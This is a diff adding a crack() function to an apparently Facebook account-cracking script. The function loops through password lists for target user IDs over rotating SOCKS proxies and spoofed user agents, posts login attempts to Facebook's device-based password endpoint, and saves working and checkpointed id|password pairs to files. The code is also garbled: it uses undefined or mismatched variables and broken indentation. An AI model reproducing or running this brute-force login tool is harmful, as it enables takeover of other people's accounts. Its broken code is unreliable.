@@ -1335,8 +1335,44 @@ def ffb6(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 		
-
-		
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r{bo} [BLADE-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			ses.headers.update({"Host":'p.facebook.com','upgrade-insecure-requests': '1','user-agent':ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]**[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',"dnt":"1",'x-requested-with': 'XMLHttpRequest','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','referer': 'https://mbasic.facebook.com/',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',})
+			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
+			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0',"accept-encoding":"gzip, deflate br",'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','origin': 'https://p.facebook.com','referer': 'https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-asbd-id': '198387','x-fb-lsd': 'AVokZHZJEcA','x-requested-with': 'XMLHttpRequest','x-response-format': 'JSONStream','user-agent': ua})
+			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+		    if "c_user" in AXI:
+				coki=session.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
+				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				oks.append(ids)
+				break
+			elif 'checkpoint' in AXI:
+				if 'y' in pcp:
+					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					cps.append(ids)
+					break
+				else:
+					break
+			else:
+				continue
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	loop+=1
 	
 def menu_apikey():  
   uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
